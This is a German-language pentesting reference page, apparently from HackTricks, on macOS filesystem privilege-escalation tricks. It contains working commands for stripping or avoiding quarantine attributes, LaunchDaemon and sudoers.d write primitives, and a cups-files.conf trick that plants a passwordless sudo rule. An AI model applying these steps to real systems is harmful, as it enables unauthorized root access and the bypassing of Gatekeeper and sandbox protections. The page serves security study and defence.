# macOS-FS-Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX-Berechtigungskombinationen

Für ein **Verzeichnis** bedeuten die drei Berechtigungsbits etwas anderes als bei einer regulären Datei. `chmod(1)` bezeichnet das Execute-Bit bei Anwendung auf ein Verzeichnis als "**search**":<sup>[2]</sup>

> `0100` Bei Dateien die Ausführung durch den Besitzer erlauben. Bei Verzeichnissen dem Besitzer erlauben, das Verzeichnis zu **durchsuchen**.

- **read** - Sie können die Verzeichniseinträge **aufzählen** (die Namen auflisten).
- **write** - Sie können **Einträge im Verzeichnis erstellen, umbenennen und löschen**. Beachten Sie, dass dies eine Eigenschaft des *enthaltenden* Verzeichnisses ist, nicht der Datei: Sie können eine Datei löschen, die Sie weder lesen noch beschreiben können, solange Sie in ihr übergeordnetes Verzeichnis schreiben können.
- Zum Löschen eines **Unterverzeichnisses** muss dieses leer sein, was wiederum ausreichende Berechtigungen zum Entfernen aller darin enthaltenen Elemente erfordert.
- Wenn das Verzeichnis das **Sticky-Bit** (`S_ISVTX`, wie `/tmp`) besitzt, ist dies eingeschränkt — POSIX legt fest, dass ein Prozess darin Dateien nur dann entfernen oder umbenennen darf, wenn er die Datei oder das Verzeichnis besitzt oder über entsprechende Berechtigungen verfügt.<sup>[1]</sup>
- **execute / search** - Sie dürfen das Verzeichnis **durchlaufen**. Die Pfadauflösung findet jede Komponente "in dem von ihrem Vorgänger angegebenen Verzeichnis". Daher macht der Verlust der Suchberechtigung für jede einzelne Komponente des Pfadpräfixes alles darunter per Pfad nicht erreichbar, selbst wenn die Blattdatei selbst für alle lesbar ist.<sup>[1]</sup>

### Gefährliche Kombinationen

**Wie man eine root gehörende Datei/einen root gehörenden Ordner überschreibt**, wenn:

- Ein übergeordnetes **Verzeichnis im Pfad** dem Benutzer gehört
- Ein übergeordnetes **Verzeichnis im Pfad** einer **Benutzergruppe** gehört, die **Schreibzugriff** besitzt
- Eine **Benutzergruppe** **Schreibzugriff** auf die **Datei** besitzt

Bei jeder der vorherigen Kombinationen könnte ein Angreifer einen **sym/hard link** in den erwarteten Pfad **inject**, um einen privilegierten arbitrary write zu erhalten.

### Sonderfall: Root-Ordner mit R+X

Dies ergibt sich direkt aus der oben beschriebenen Regel der Pfadauflösung. Wenn ein **Verzeichnis R+X nur für root gewährt**, sind die darin enthaltenen Dateien für alle anderen *per Pfad* nicht erreichbar — die **eigenen Berechtigungsbits der Dateien können jedoch weiterhin großzügig sein**. Das Verzeichnis ist das einzige Hindernis.

Daher wird jedes Primitive, mit dem Sie die Datei **aus diesem Verzeichnis herausbekommen** — etwa ein privilegierter Prozess, der einen vom Angreifer gewählten Pfad an einen Ort **verschiebt/umbenennt/kopiert**, den Sie durchlaufen können — zu einem arbitrary read, ohne jemals die eigenen Berechtigungen der Datei überwinden zu müssen:
```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```
Suche nach privilegierten Datei-Verschiebern (Installationsprogrammen, Log-Rotationsprogrammen, Crash-/Diagnosesammlern, Backup- und „Export“-Funktionen), die einen Quellpfad von einem Benutzer mit geringeren Privilegien akzeptieren.

## Symbolic Link / Hard Link

### Freizügige Datei/Ordner

Wenn ein privilegierter Prozess Daten in eine **Datei** schreibt, die von einem **Benutzer mit geringeren Privilegien kontrolliert** werden kann oder zuvor von einem solchen Benutzer **erstellt** wurde, kann der Benutzer sie einfach über einen Symbolic oder Hard link auf eine andere Datei **verweisen**, und der privilegierte Prozess schreibt in diese Datei.

Prüfe die anderen Abschnitte, in denen ein Angreifer einen **beliebigen Schreibzugriff missbrauchen könnte, um Privilegien zu eskalieren**.

### Open `O_NOFOLLOW`

Laut [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *„Wenn `O_NOFOLLOW` in der Maske verwendet wird und die an `open()` übergebene Zieldatei ein symbolischer Link ist, schlägt `open()` fehl.“* Nur die **letzte** Komponente wird geprüft — jede **dazwischenliegende** Komponente wird weiterhin aufgelöst und verfolgt. Ein Entwickler, der einen Schreibvorgang mit `O_NOFOLLOW` „geschützt“ hat, kann daher weiterhin angegriffen werden, indem ein Symlink in einem beliebigen **übergeordneten Verzeichnis** des Zielpfads platziert wird.<sup>[3]</sup>

Dieselbe Manpage dokumentiert die Flags, die diese Lücke tatsächlich schließen:<sup>[3]</sup>

- **`O_NOFOLLOW_ANY`** — *„Wenn ... eine beliebige Komponente des an `open()` übergebenen Pfads ein symbolischer Link ist, schlägt `open()` fehl.“*
- **`O_RESOLVE_BENEATH`** — *„Wenn ... die angegebene Pfadauflösung aus dem mit dem FD verbundenen Verzeichnis herausführt, schlägt `openat()` fehl.“*

Andernfalls sind `openat()` relativ zu einem Directory FD, das bereits validiert wurde, oder `realpath()` + erneute Validierung die verbleibenden Möglichkeiten, Symlink-Austauschvorgänge innerhalb des Pfads zu verhindern.

## .fileloc

Dateien mit der Erweiterung **`.fileloc`** können auf andere Anwendungen oder Binaries verweisen, sodass beim Öffnen dieser Dateien die jeweilige Anwendung bzw. das Binary ausgeführt wird.\
Beispiel:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Dateideskriptoren

### Leak FD (no `O_CLOEXEC`)

Wenn ein Aufruf von `open` nicht über das Flag `O_CLOEXEC` verfügt, wird der Dateideskriptor an den Child-Prozess vererbt. Wenn also ein privilegierter Prozess eine privilegierte Datei öffnet und einen vom Angreifer kontrollierten Prozess ausführt, wird der Angreifer den **FD für die privilegierte Datei erben**.

Das kanonische Beispiel ist die **`DYLD_PRINT_TO_FILE` LPE in OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[4]</sup>

- `dyld` berücksichtigte `DYLD_PRINT_TO_FILE=/path` sogar in **restricted (suid root) binaries**, weil diese spezielle Variable außerhalb von `processDyldEnvironmentVariable()` geparst wurde.
- Es führte `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)` aus und **erstellte daher eine root-owned Datei an einem beliebigen Pfad**.
- Der FD wurde **niemals geschlossen und hatte kein close-on-exec-Flag**, sodass jeder Child-Prozess des suid-Binary einen **schreibbaren FD für eine root-owned Datei erbte**.
- Wenn man beispielsweise `DYLD_PRINT_TO_FILE=/etc/target suid_binary` ausführte und anschließend die Nummer des geerbten FD im Child-Prozess auslas, waren beliebige Schreibvorgänge in root-owned Dateien möglich; `fcntl(fd, F_SETFL, 0)` entfernte sogar `O_APPEND`, sodass Überschreiben statt Anhängen möglich war.

Dasselbe Muster tritt immer dann auf, wenn ein privilegierter Prozess eine Datei **vor** dem `exec` eines von dir kontrollierten Prozesses öffnet (Helper-Tools, über `$EDITOR` aufgerufene Editoren im Stil von `crontab`, Log-/Debug-Dateien, die über einen Env-Var-Pfad geöffnet werden ...). Liste die geerbten FDs mit folgendem Befehl auf:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
Alles über `2`, das auf eine Datei verweist, die du nicht selbst öffnen kannst, ist ein Arbitrary-Write- (oder Arbitrary-Read-) Primitive.

## Tricks mit quarantine xattrs vermeiden

### EntfernenVerfügbar
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Wenn eine Datei/ein Ordner dieses immutable-Attribut besitzt, ist es nicht möglich, ein xattr darauf zu setzen.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Dateisysteme ohne xattr-Unterstützung

Nicht jedes Dateisystem, das macOS einbinden kann, speichert **erweiterte Attribute** nativ. HFS+ und APFS unterstützen dies; **FAT32, exFAT und (die meisten) NFS-Einhängungen jedoch nicht** – macOS emuliert sie, indem es eine **AppleDouble**-Begleitdatei namens `._<filename>` schreibt ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[5]</sup>

Das ist für Quarantäne relevant, da das xattr nur erhalten bleibt, wenn es tatsächlich auf dasselbe Volume geschrieben **und von dort wieder gelesen** werden kann:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
Wenn das Volume später über einen Pfad gelesen wird, der den `._`-Begleiter ignoriert (oder der Begleiter entfernt/gelöscht wurde), kommt die Datei **ohne Quarantine-Flag** an – und eine nicht unter Quarantäne stehende `.app` reicht aus, um die App Sandbox zu umgehen, wie unter [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute) beschrieben.

### writeextattr ACL

Diese ACL verhindert, dass der Datei `xattrs` hinzugefügt werden.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Das **AppleDouble**-Dateiformat kopiert eine Datei einschließlich ihrer ACEs.

Im [**Quellcode**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) ist zu sehen, dass die im xattr namens **`com.apple.acl.text`** gespeicherte ACL-Textdarstellung als ACL in der dekomprimierten Datei gesetzt wird. Wenn du also eine Anwendung mit dem **AppleDouble**-Dateiformat in eine ZIP-Datei komprimierst und dabei eine ACL verwendest, die verhindert, dass andere xattrs in die Datei geschrieben werden, wird das Quarantine-xattr nicht in der Anwendung gesetzt:

Siehe den [**Originalbericht**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) für weitere Informationen.<sup>[6]</sup>

Um dies zu reproduzieren, müssen wir zunächst den korrekten ACL-String ermitteln:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Beachte, dass die sandbox selbst dann zuvor das Quarantine-xattr schreibt, wenn dies funktioniert.)

Nicht wirklich erforderlich, aber ich lasse es vorsichtshalber hier:

{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Signaturprüfungen umgehen

### Prüfungen auf platform binaries umgehen

Einige Sicherheitsprüfungen überprüfen, ob es sich bei der Binary um eine **platform binary** handelt, beispielsweise um eine Verbindung zu einem XPC-Service zu erlauben. Wie in https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ gezeigt, ist es jedoch möglich, diese Prüfung zu umgehen, indem man eine platform binary (wie /bin/ls) verwendet und den Exploit über dyld mithilfe der Umgebungsvariable `DYLD_INSERT_LIBRARIES` einschleust.<sup>[7]</sup>

### Die Flags `CS_REQUIRE_LV` und `CS_FORCED_LV` umgehen

Eine ausgeführte Binary kann ihre eigenen Flags ändern, um Prüfungen mit Code wie dem folgenden zu umgehen:<sup>[7]</sup>
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Code-Signaturen umgehen

Bundles enthalten die Datei **`_CodeSignature/CodeResources`**, die den **Hash** jeder einzelnen **Datei** im **Bundle** enthält. Beachte, dass der Hash von CodeResources ebenfalls **in die ausführbare Datei eingebettet** ist, daher können wir auch daran nichts ändern.

Es gibt jedoch einige Dateien, deren Signatur nicht überprüft wird. Diese enthalten den Schlüssel `omit` in der plist, zum Beispiel:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Es ist möglich, die Signatur einer Ressource über die CLI zu berechnen mit:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## DMGs mounten

Ein Benutzer kann ein benutzerdefiniertes DMG mounten, das sogar über einigen vorhandenen Ordnern erstellt wurde. So können Sie ein benutzerdefiniertes DMG-Paket mit benutzerdefinierten Inhalten erstellen:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Normalerweise mountet macOS Datenträger über den Mach-Service `com.apple.DiskArbitrarion.diskarbitrariond` (bereitgestellt von `/usr/libexec/diskarbitrationd`). Wenn der Parameter `-d` zur LaunchDaemons-plist-Datei hinzugefügt und der Dienst neu gestartet wird, werden die Logs in `/var/log/diskarbitrationd.log` gespeichert.\
Es ist jedoch möglich, Tools wie `hdik` und `hdiutil` zu verwenden, um direkt mit dem kext `com.apple.driver.DiskImages` zu kommunizieren.

## Beliebige Schreibvorgänge

### Periodische sh-Skripte

Wenn dein Skript als **shell script** interpretiert werden kann, könntest du das **`/etc/periodic/daily/999.local`**-shell script überschreiben, das jeden Tag ausgeführt wird.

Du kannst eine **fake**-Ausführung dieses Skripts mit folgendem Befehl durchführen: **`sudo periodic daily`**

### Daemons

Schreibe einen beliebigen **LaunchDaemon** wie **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** mit einer plist, die ein beliebiges Skript ausführt, etwa:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Erstelle einfach das Skript `/Applications/Scripts/privesc.sh` mit den **commands**, die du als root ausführen möchtest.

### Sudoers File

Wenn du über **arbitrary write** verfügst, könntest du eine Datei im Ordner **`/etc/sudoers.d/`** erstellen, die dir **sudo**-Berechtigungen gewährt.

### PATH files

Die Datei **`/etc/paths`** ist eine der wichtigsten Stellen, an denen die PATH-Umgebungsvariable befüllt wird. Du musst root sein, um sie zu überschreiben. Wenn jedoch ein Skript eines **privileged process** einen **command ohne den vollständigen Pfad** ausführt, kannst du ihn möglicherweise **hijacken**, indem du diese Datei änderst.

Du kannst auch Dateien in **`/etc/paths.d`** schreiben, um neue Ordner in die PATH-Umgebungsvariable zu laden.

### cups-files.conf

Diese Technik wurde in [diesem writeup](https://www.kandji.io/blog/macos-audit-story-part1) verwendet.<sup>[8]</sup>

Erstelle die Datei `/etc/cups/cups-files.conf` mit folgendem Inhalt:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Dadurch wird die Datei `/etc/sudoers.d/lpe` mit den Berechtigungen 777 erstellt. Der zusätzliche Müll am Ende dient dazu, die Erstellung des Fehlerprotokolls auszulösen.

Schreibe anschließend die benötigte Konfiguration zur Eskalation der Berechtigungen in `/etc/sudoers.d/lpe`, wie etwa `%staff ALL=(ALL) NOPASSWD:ALL`.

Ändere danach `/etc/cups/cups-files.conf` erneut und gib `LogFilePerm 700` an, damit die neue sudoers-Datei durch den Aufruf von `cupsctl` gültig wird.

### Sandbox Escape

Es ist möglich, mit einem FS arbitrary write aus der macOS-Sandbox auszubrechen. Einige Beispiele findest du auf der Seite [macOS Auto Start](../../../../macos-auto-start-locations.md). Eine häufige Methode besteht jedoch darin, eine Terminal-Einstellungsdatei in `~/Library/Preferences/com.apple.Terminal.plist` zu schreiben, die beim Start einen Befehl ausführt, und sie mit `open` aufzurufen.

## Generate writable files as other users

Ein sehr häufiges privesc primitive besteht darin, dass ein **privilegierter Prozess für dich eine Datei** in einem von dir kontrollierten Verzeichnis erstellt und du anschließend den **Schreibzugriff** auf diese Datei behältst. Dafür sind zwei Voraussetzungen erforderlich:

1. Ein Verzeichnis, das dir gehört (oder in dem du eine **inheritable ACL** setzen kannst), sodass alles, was darin erstellt wird, deine Berechtigungen erbt.
2. Ein privilegierter/`suid`-Prozess, dem vorgegeben werden kann, **wo** eine Datei erstellt werden soll — typischerweise über eine Debug-/Logging-Umgebungsvariable, eine Konfigurationsdatei oder die XPC API eines Helpers.

Der Teil mit der **inheritable ACL** sorgt dafür, dass die erstellte Datei von dir beschreibbar ist, obwohl sie einem anderen Benutzer gehört. Die Vererbungsflags `file_inherit` / `directory_inherit` sind in [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html) dokumentiert:
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Jetzt ist jede Datei, die ein privilegierter Prozess innerhalb von `$DIRNAME` erstellt, **für dich beschreibbar**. Wenn dieses Verzeichnis außerdem ein Ort ist, der später **als root ausgeführt** wird (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, ein LaunchDaemon-Verzeichnis ...), ist dies eine direkte root-Eskalation. Siehe oben die Abschnitte [Sudoers File](#sudoers-file) und [cups-files.conf](#cups-filesconf), um zu erfahren, was du schreiben musst, sobald du die Datei hast.

Ein vollständiges Beispiel für die Kette „Eine Umgebungsvariable veranlasst einen root-Prozess, eine Datei zu erstellen, und der FD wird an dich weitergegeben“ findest du oben unter [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec).

## POSIX Shared Memory

**POSIX Shared Memory** ermöglicht es Prozessen in POSIX-konformen Betriebssystemen, auf einen gemeinsamen Speicherbereich zuzugreifen, wodurch eine schnellere Kommunikation im Vergleich zu anderen Interprozesskommunikationsmethoden ermöglicht wird. Dabei wird mit `shm_open()` ein Shared-Memory-Objekt erstellt oder geöffnet, seine Größe mit `ftruncate()` festgelegt und es mithilfe von `mmap()` in den Adressraum des Prozesses eingeblendet. Prozesse können anschließend direkt aus diesem Speicherbereich lesen und in ihn schreiben. Um den gleichzeitigen Zugriff zu verwalten und Datenkorruption zu verhindern, werden häufig Synchronisierungsmechanismen wie Mutexes oder Semaphoren verwendet. Abschließend heben die Prozesse die Zuordnung des Shared Memory mit `munmap()` auf und schließen ihn mit `close()`; optional kann das Speicherobjekt mit `shm_unlink()` entfernt werden. Dieses System eignet sich besonders für effiziente, schnelle IPC-Operationen in Umgebungen, in denen mehrere Prozesse schnell auf gemeinsam genutzte Daten zugreifen müssen.

<details>

<summary>Beispielcode für den Producer</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Beispiel für Consumer-Code</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## Geschützte Deskriptoren in macOS

**macOSCguarded descriptors** sind eine in macOS eingeführte Sicherheitsfunktion, die die Sicherheit und Zuverlässigkeit von **file descriptor operations** in Benutzeranwendungen verbessert. Diese geschützten Deskriptoren bieten eine Möglichkeit, bestimmte Einschränkungen oder „guards“ mit file descriptors zu verknüpfen, die vom Kernel durchgesetzt werden.

Diese Funktion ist besonders nützlich, um bestimmte Klassen von Sicherheitslücken zu verhindern, etwa **unbefugten Dateizugriff** oder **race conditions**. Diese Sicherheitslücken treten beispielsweise auf, wenn ein Thread auf eine file description zugreift und dadurch einem **anderen verwundbaren Thread Zugriff darauf gewährt**, oder wenn ein file descriptor von einem **verwundbaren Kindprozess geerbt** wird. Einige mit dieser Funktion verbundene Funktionen sind:

- `guarded_open_np`: Öffnet einen FD mit einem guard
- `guarded_close_np`: Schließt ihn
- `change_fdguard_np`: Ändert guard flags eines Deskriptors (kann sogar den guard-Schutz entfernen)

## Referenzen

- [1] [POSIX.1-2024 — Basisdefinitionen, Kap. 4 (Dateizugriffsberechtigungen, Verzeichnisschutz, Auflösung von Pfadnamen)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [Manpage zu `chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html) (Verzeichnissuch-/Ausführungsbit, ACL-Vererbungsflags)
- [3] [Manpage zu `open(2)`](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (geleakter FD ohne close-on-exec)
- [5] [The Eclectic Light Company - Welche Dateisysteme und Cloud-Dienste erweiterten Attribute beibehalten](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft - Gatekeepers Achillesferse: Eine macOS-Sicherheitslücke aufgedeckt](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) - Eine neue Ära von macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Apple-Sicherheitslücken aufgedeckt: Die Audit-Geschichte von diskarbitrationd und storagekitd, Teil 1](https://www.kandji.io/blog/macos-audit-story-part1)

{{#include ../../../../banners/hacktricks-training.md}}
